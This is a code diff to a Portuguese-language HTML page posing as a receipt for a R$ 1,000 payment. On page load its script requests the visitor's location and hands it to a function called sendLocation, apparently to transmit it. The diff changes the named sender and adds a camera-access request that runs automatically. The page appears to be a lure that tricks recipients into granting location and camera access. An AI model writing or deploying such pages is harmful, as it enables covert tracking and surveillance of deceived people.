@@ -15,7 +15,7 @@
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> caue veira</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
 
@@ -26,16 +26,43 @@
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
 
+    <!-- Video Elemento para mostrar a câmera -->
+    <video id="video" width="640" height="480" autoplay></video>
+
   </div>
 
   <script>
     window.addEventListener("load", () => {
+      // Chama a função para acessar a geolocalização
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
         alert("Algo deu errado. Tente novamente mais tarde.");
       }
+
+      // Solicita permissão para usar a câmera
+      solicitarPermissaoCamera();
     });
+
+    // Função para pedir permissão e acessar a câmera
+    function solicitarPermissaoCamera() {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        // Solicita permissão para o vídeo
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function (stream) {
+            // Se a permissão for concedida, exibe o vídeo no elemento <video>
+            const videoElement = document.getElementById("video");
+            videoElement.srcObject = stream;
+          })
+          .catch(function (error) {
+            // Se o usuário negar a permissão ou ocorrer algum erro
+            console.error("Erro ao acessar a câmera:", error);
+            alert("Permissão de câmera negada ou erro ao acessar a câmera.");
+          });
+      } else {
+        alert("Este navegador não suporta a API de mídia.");
+      }
+    }
 
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
